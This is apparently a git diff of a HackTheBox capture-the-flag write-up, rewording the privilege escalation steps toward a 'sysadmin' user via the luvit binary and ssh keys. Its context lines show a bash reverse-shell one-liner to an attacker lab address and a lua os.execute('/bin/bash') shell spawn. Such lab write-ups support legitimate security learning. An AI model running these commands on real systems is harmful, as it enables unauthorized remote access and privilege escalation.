@@ -112,18 +112,17 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.4/1337 0>&1'
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c7ab4b96-ae8f-45df-8825-c177f4ff3123)
 
 
-18. BUT thing to note, the binary is still accessible outisde the **sysadmin** home directory.
+18. BUT thing to note, upon checking the sudo permission seems **luvit** is executable by any user.
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/30fcc402-ea95-46e5-83d8-9b12e350fb76)
 
 
-19. Hence, there is a chance the other files are done the same. Now we're targeting the **.ssh** key.
-20. Remembering we can specify a username, hence introducing 2 methods can be done to gain access to sysadmin's home directory.
-21. The first method is using the **luvit** binary, the second method is by generating the ssh-keys.
+19. Remembering we can specify a username, hence introducing 2 steps can be done to gain access to sysadmin's home directory.
+20. The first step is using the **luvit** binary, the second method is by generating the ssh-keys to get stable shell as **sysadmin**.
 
 ===
 
-### 1st Method
+### 1st Step
 
 - Sending shell spawn LOCs to lua.
 
@@ -140,7 +139,7 @@ echo "os.execute('/bin/bash');" > sysad.lua
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/54a0f835-d4c9-4fda-a9d1-840b85d5aa60)
 
 
-### 2nd Method
+### 2nd Step
 
 - Generating ssh-keys
 
